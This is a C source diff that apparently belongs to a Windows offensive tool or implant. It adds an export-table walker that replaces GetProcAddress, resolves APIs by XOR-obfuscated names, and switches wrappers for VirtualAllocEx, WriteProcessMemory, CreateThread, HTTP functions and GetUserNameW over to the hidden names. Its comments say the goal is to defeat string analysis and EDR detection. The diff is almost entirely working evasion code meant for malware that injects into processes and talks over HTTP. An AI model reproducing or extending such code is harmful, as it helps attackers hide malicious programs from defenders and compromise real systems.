@@ -332,6 +332,14 @@ If the function cannot be found, each func can look it up:
 // WhisperApi Funcs ---------------------------
 // --------------------------------------------
 
+void XorText(char *text, char key) {
+    size_t len = strlen(text);
+    for (size_t i = 0; i < len; i++) {
+        text[i] = text[i] ^ key;  // XOR each character with key (not doing index)
+    }
+}
+
+
 FARPROC ResolveFunction(const wchar_t* module_name, const char* function_name)
 {
     DEBUG_LOG("[+] Attempting to resolve function %s\n", function_name);
@@ -348,13 +356,118 @@ FARPROC ResolveFunction(const wchar_t* module_name, const char* function_name)
 
     DEBUG_LOGW(L"[+] Successful handle to %ls \n", module_name);
 
-    FARPROC pFunc = GetProcAddress(hModule, function_name);
+    FARPROC pFunc = GetProcAddressReplacement(hModule, function_name);//GetProcAddress(hModule, function_name);
     if (!pFunc) {
         DEBUG_LOG("[-] GetProcAddress failed for %s. Error=%lu.\n", function_name, GetLastError());
         return NULL;
     }
 
     return pFunc;
+}
+
+FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpFuncNameXor) {
+    /*
+        (Modified) Drop-in replacement for GetProcAddress, adapted from MalDev.
+
+        ## Purpose:
+        This function takes a handle to a DLL (`hModule`) and an **XOR-obfuscated** function name (`lpFuncNameXor`).
+        It iterates through the module's exported functions, **XORs each function name**, and compares it 
+        to `lpFuncNameXor`. If a match is found, it returns the function's address.
+
+        ## Why XOR the function name?
+        Normally, calling `ResolveFunction("kernel32.dll", "MessageBoxA")` leaves function names 
+        as **plaintext in the binary**, making them visible in tools like `strings` or static analysis.
+        By XOR-ing function names, we **obfuscate them**, keeping them out of memory and the binary, 
+        making direct function name detection harder.
+
+        Example:
+            key = 0x10
+            MessageBoxA =[XOR]=> `]uccqwuRhQ` 
+                HEX: `0x5d,0x75,0x63,0x63,0x71,0x77,0x75,0x52,0x7f,0x68,0x51`
+
+            (assuming we are also searching for MessageBoxA)
+            CHAR* pFunctionName =[XOR]=> `]uccqwuRhQ`
+
+            `]uccqwuRhQ` == `]uccqwuRhQ`, so return address of this function.
+
+
+        ## Parameters:
+        - `hModule` (HMODULE): Handle to the loaded DLL containing the target function.
+        - `lpFuncNameXor` (LPCSTR): The **XOR-encrypted function name** to search for.
+
+        ## Returns:
+        - The function's address (`FARPROC`) if found.
+        - `NULL` if the function is not found.
+
+        ## Notes:
+        - This does **not** decrypt function names, it simply **compares XOR’d names** to avoid plaintext function names.
+        - Running `strings` on the binary will no longer reveal function names like `"MessageBoxA"`.
+
+    */
+	// We do this to avoid casting at each time we use 'hModule'
+	PBYTE pBase = (PBYTE)hModule;
+	
+	// Getting the dos header and doing a signature check
+	PIMAGE_DOS_HEADER	pImgDosHdr		= (PIMAGE_DOS_HEADER)pBase;
+	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) 
+		return NULL;
+	
+	// Getting the nt headers and doing a signature check
+	PIMAGE_NT_HEADERS	pImgNtHdrs		= (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
+	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) 
+		return NULL;
+
+	// Getting the optional header
+	IMAGE_OPTIONAL_HEADER	ImgOptHdr	= pImgNtHdrs->OptionalHeader;
+
+	// Getting the image export table
+	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+	// Getting the function's names array pointer
+	PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
+	
+	// Getting the function's addresses array pointer
+	PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
+	
+	// Getting the function's ordinal array pointer
+	PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
+
+
+	// Looping through all the exported functions
+	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
+		
+		// Getting the name of the function (read only)
+        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
+
+		// Getting the address of the function through its ordinal
+		PVOID pFunctionAddress	= (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
+
+
+        size_t pFunctionName_Length = strlen(pFunctionName);  // Get actual string length
+        BYTE* pFunctionNameXor = (BYTE*)malloc(pFunctionName_Length + 1);
+        if (!pFunctionNameXor) {
+            return NULL;
+        }
+
+        // Copy original name before XOR-ing
+        memcpy(pFunctionNameXor, pFunctionName, pFunctionName_Length + 1);
+
+        //XOR pFuncName, to use for comparison below
+        for (size_t j = 0; j < pFunctionName_Length; j++) {
+            pFunctionNameXor[j] ^= FUNC_ENCRYPTED_NAME_KEY;
+        }
+
+        //compare lpFuncName, and pFunctionNameXor, which are now both XOR'd.
+        if (memcmp(lpFuncNameXor, pFunctionNameXor, pFunctionName_Length) == 0) {
+			DEBUG_LOG("[ %0.4d ] FOUND API -\t NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n", i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
+	        //call a secure free (instead of regular free) to 0 out the memory where the XOR func name was stored, just in case
+            //an EDR gets smart and tries to brute force the XOR value
+            SecureFree(pFunctionNameXor, strlen(pFunctionNameXor));
+
+            return pFunctionAddress;
+		}
+	}
+	return NULL;
 }
 
 // --------------------------------------------
@@ -406,7 +519,7 @@ HANDLE WhisperCreateThread(
     DEBUG_LOG("[FUNC_CALL] WhisperCreateThread\n");
 
     if (!pCreateThread) {
-        pCreateThread = (CreateThread_t)ResolveFunction(L"kernel32.dll", "CreateThread");
+        pCreateThread = (CreateThread_t)ResolveFunction(L"kernel32.dll", FUNC_WhisperCreateThread_ENCRYPTED_NAME);
         if (!pCreateThread)
             return NULL;
     }
@@ -414,13 +527,13 @@ HANDLE WhisperCreateThread(
     return pCreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
 }
 
+
 static ResumeThread_t pResumeThread = NULL;
 DWORD WhisperResumeThread(HANDLE hThread)
 {
     DEBUG_LOG("[FUNC_CALL] WhisperResumeThread\n");
-
     if (!pResumeThread) {
-        pResumeThread = (ResumeThread_t)ResolveFunction(L"kernel32.dll", "ResumeThread");
+        pResumeThread = (ResumeThread_t)ResolveFunction(L"kernel32.dll", FUNC_ResumeThread_ENCRYPTED_NAME);
         if (!pResumeThread)
             return -1;
     }
@@ -438,7 +551,7 @@ LPVOID WhisperVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, D
     DEBUG_LOG("[FUNC_CALL] WhisperVirtualAllocEx\n");
 
     if (!pVirtualAllocEx) {
-        pVirtualAllocEx = (VirtualAllocEx_t)ResolveFunction(L"kernel32.dll", "VirtualAllocEx");
+        pVirtualAllocEx = (VirtualAllocEx_t)ResolveFunction(L"kernel32.dll", FUNC_VirtualAllocEx_ENCRYPTED_NAME);
         if (!pVirtualAllocEx)
             return NULL;
     }
@@ -450,9 +563,8 @@ static WriteProcessMemory_t pWriteProcessMemory = NULL;
 BOOL WhisperWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten)
 {
     DEBUG_LOG("[FUNC_CALL] WhisperWriteProcessMemory\n");
-
     if (!pWriteProcessMemory) {
-        pWriteProcessMemory = (WriteProcessMemory_t)ResolveFunction(L"kernel32.dll", "WriteProcessMemory");
+        pWriteProcessMemory = (WriteProcessMemory_t)ResolveFunction(L"kernel32.dll", FUNC_WriteProcessMemory_ENCRYPTED_NAME);
         if (!pWriteProcessMemory)
             return FALSE;
     }
@@ -468,9 +580,8 @@ static CreatePipe_t pCreatePipe = NULL;
 BOOL WhisperCreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize)
 {
     DEBUG_LOG("[FUNC_CALL] WhisperCreatePipe\n");
-
     if (!pCreatePipe) {
-        pCreatePipe = (CreatePipe_t)ResolveFunction(L"kernel32.dll", "CreatePipe");
+        pCreatePipe = (CreatePipe_t)ResolveFunction(L"kernel32.dll", FUNC_CreatePipe_ENCRYPTED_NAME);
         if (!pCreatePipe)
             return FALSE;
     }
@@ -482,9 +593,8 @@ static SetHandleInformation_t pSetHandleInformation = NULL;
 BOOL WhisperSetHandleInformation(HANDLE hObject, DWORD dwMask, DWORD dwFlags)
 {
     DEBUG_LOG("[FUNC_CALL] WhisperSetHandleInformation\n");
-
     if (!pSetHandleInformation) {
-        pSetHandleInformation = (SetHandleInformation_t)ResolveFunction(L"kernel32.dll", "SetHandleInformation");
+        pSetHandleInformation = (SetHandleInformation_t)ResolveFunction(L"kernel32.dll", FUNC_SetHandleInformation_ENCRYPTED_NAME);
         if (!pSetHandleInformation)
             return FALSE;
     }
@@ -498,7 +608,7 @@ BOOL WhisperCloseHandle(HANDLE hObject)
     DEBUG_LOG("[FUNC_CALL] WhisperCloseHandle\n");
 
     if (!pCloseHandle) {
-        pCloseHandle = (CloseHandle_t)ResolveFunction(L"kernel32.dll", "CloseHandle");
+        pCloseHandle = (CloseHandle_t)ResolveFunction(L"kernel32.dll", FUNC_CloseHandle_ENCRYPTED_NAME);
         if (!pCloseHandle)
             return FALSE;
     }
@@ -516,7 +626,7 @@ HINTERNET WhisperInternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpsz
     DEBUG_LOG("[FUNC_CALL] WhisperInternetOpenA\n");
 
     if (!pInternetOpenA) {
-        pInternetOpenA = (InternetOpenA_t)ResolveFunction(L"wininet.dll", "InternetOpenA");
+        pInternetOpenA = (InternetOpenA_t)ResolveFunction(L"wininet.dll", FUNC_InternetOpenA_ENCRYPTED_NAME);
         if (!pInternetOpenA)
             return NULL;
     }
@@ -538,7 +648,7 @@ HINTERNET WhisperInternetConnectA(
     DEBUG_LOG("[FUNC_CALL] WhisperInternetConnectA\n");
 
     if (!pInternetConnectA) {
-        pInternetConnectA = (InternetConnectA_t)ResolveFunction(L"wininet.dll", "InternetConnectA");
+        pInternetConnectA = (InternetConnectA_t)ResolveFunction(L"wininet.dll", FUNC_InternetConnectA_ENCRYPTED_NAME);
         if (!pInternetConnectA)
             return NULL;
     }
@@ -560,7 +670,7 @@ HINTERNET WhisperHttpOpenRequestA(
     DEBUG_LOG("[FUNC_CALL] WhisperHttpOpenRequestA\n");
 
     if (!pHttpOpenRequestA) {
-        pHttpOpenRequestA = (HttpOpenRequestA_t)ResolveFunction(L"wininet.dll", "HttpOpenRequestA");
+        pHttpOpenRequestA = (HttpOpenRequestA_t)ResolveFunction(L"wininet.dll", FUNC_HttpOpenRequestA_ENCRYPTED_NAME);
         if (!pHttpOpenRequestA)
             return NULL;
     }
@@ -572,9 +682,8 @@ static HttpSendRequestA_t pHttpSendRequestA = NULL;
 BOOL WhisperHttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
 {
     DEBUG_LOG("[FUNC_CALL] WhisperHttpSendRequestA\n");
-
     if (!pHttpSendRequestA) {
-        pHttpSendRequestA = (HttpSendRequestA_t)ResolveFunction(L"wininet.dll", "HttpSendRequestA");
+        pHttpSendRequestA = (HttpSendRequestA_t)ResolveFunction(L"wininet.dll", FUNC_HttpSendRequestA_ENCRYPTED_NAME);
         if (!pHttpSendRequestA)
             return FALSE;
     }
@@ -588,7 +697,7 @@ HINTERNET WhisperInternetOpenUrlW(HINTERNET hInternet, LPCWSTR lpszUrl, LPCWSTR 
     DEBUG_LOG("[FUNC_CALL] WhisperInternetOpenUrlW\n");
 
     if (!pInternetOpenUrlW) {
-        pInternetOpenUrlW = (InternetOpenUrlW_t)ResolveFunction(L"wininet.dll", "InternetOpenUrlW");
+        pInternetOpenUrlW = (InternetOpenUrlW_t)ResolveFunction(L"wininet.dll", FUNC_InternetOpenUrlW_ENCRYPTED_NAME);
         if (!pInternetOpenUrlW)
             return NULL;
     }
@@ -602,7 +711,7 @@ BOOL WhisperInternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfB
     DEBUG_LOG("[FUNC_CALL] WhisperInternetReadFile\n");
 
     if (!pInternetReadFile) {
-        pInternetReadFile = (InternetReadFile_t)ResolveFunction(L"wininet.dll", "InternetReadFile");
+        pInternetReadFile = (InternetReadFile_t)ResolveFunction(L"wininet.dll", FUNC_InternetReadFile_ENCRYPTED_NAME);
         if (!pInternetReadFile)
             return FALSE;
     }
@@ -614,9 +723,8 @@ static InternetCloseHandle_t pInternetCloseHandle = NULL;
 BOOL WhisperInternetCloseHandle(HINTERNET hInternet)
 {
     DEBUG_LOG("[FUNC_CALL]WhisperInternetCloseHandle\n");
-
     if (!pInternetCloseHandle) {
-        pInternetCloseHandle = (InternetCloseHandle_t)ResolveFunction(L"wininet.dll", "InternetCloseHandle");
+        pInternetCloseHandle = (InternetCloseHandle_t)ResolveFunction(L"wininet.dll", FUNC_InternetCloseHandle_ENCRYPTED_NAME);
         if (!pInternetCloseHandle)
             return FALSE;
     }
@@ -634,7 +742,7 @@ BOOL WhisperGetUserNameW(LPWSTR lpBuffer, LPDWORD pcbBuffer)
     DEBUG_LOG("[FUNC_CALL] WhisperGetUserNameW\n");
 
     if (!pGetUserNameW) {
-        pGetUserNameW = (GetUserNameW_t)ResolveFunction(L"Advapi32.dll", "GetUserNameW");
+        pGetUserNameW = (GetUserNameW_t)ResolveFunction(L"Advapi32.dll", FUNC_GetUserNameW_ENCRYPTED_NAME);
         if (!pGetUserNameW)
             return FALSE;
     }
@@ -647,18 +755,20 @@ BOOL WhisperGetUserNameW(LPWSTR lpBuffer, LPDWORD pcbBuffer)
 // =====================================
 
 static Sleep_t pSleep = NULL;
+
 void WhisperSleep(DWORD dwMilliseconds)
 {
     DEBUG_LOG("[FUNC_CALL] WhisperSleep\n");
 
     if (!pSleep) {
-        pSleep = (Sleep_t)ResolveFunction(L"kernel32.dll", "Sleep");
+        pSleep = (Sleep_t)ResolveFunction(L"kernel32.dll", FUNC_Sleep_ENCRYPTED_NAME);
         if (!pSleep)
             return;
     }
 
     pSleep(dwMilliseconds);
 }
+
 
 // =====================================
 //  SYNCHRONIZATION FUNCTIONS
@@ -670,7 +780,7 @@ DWORD WhisperWaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
     DEBUG_LOG("[FUNC_CALL] WhisperWaitForSingleObject\n");
 
     if (!pWaitForSingleObject) {
-        pWaitForSingleObject = (WaitForSingleObject_t)ResolveFunction(L"kernel32.dll", "WaitForSingleObject");
+        pWaitForSingleObject = (WaitForSingleObject_t)ResolveFunction(L"kernel32.dll", FUNC_WaitForSingleObject_ENCRYPTED_NAME);
         if (!pWaitForSingleObject)
             return WAIT_FAILED;
     }
@@ -686,9 +796,8 @@ static ReadFile_t pReadFile = NULL;
 BOOL WhisperReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
 {
     DEBUG_LOG("[FUNC_CALL] WhisperReadFile\n");
-
     if (!pReadFile) {
-        pReadFile = (ReadFile_t)ResolveFunction(L"kernel32.dll", "ReadFile");
+        pReadFile = (ReadFile_t)ResolveFunction(L"kernel32.dll", FUNC_ReadFile_ENCRYPTED_NAME);
         if (!pReadFile)
             return FALSE;
     }
@@ -705,10 +814,12 @@ int WhisperMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
     DEBUG_LOG("[FUNC_CALL] WhisperMessageBoxA\n");
 
     if (!pMessageBoxA) {
-        pMessageBoxA = (MessageBoxA_t)ResolveFunction(L"user32.dll", "MessageBoxA");
-        if (!pMessageBoxA)
-            return 0;
+            pMessageBoxA = (MessageBoxA_t)ResolveFunction(L"user32.dll", FUNC_WhisperMessageBoxA_ENCRYPTED_NAME);
+            if (!pMessageBoxA) {
+                return FALSE;
+            }
     }
+
 
     return pMessageBoxA(hWnd, lpText, lpCaption, uType);
 }
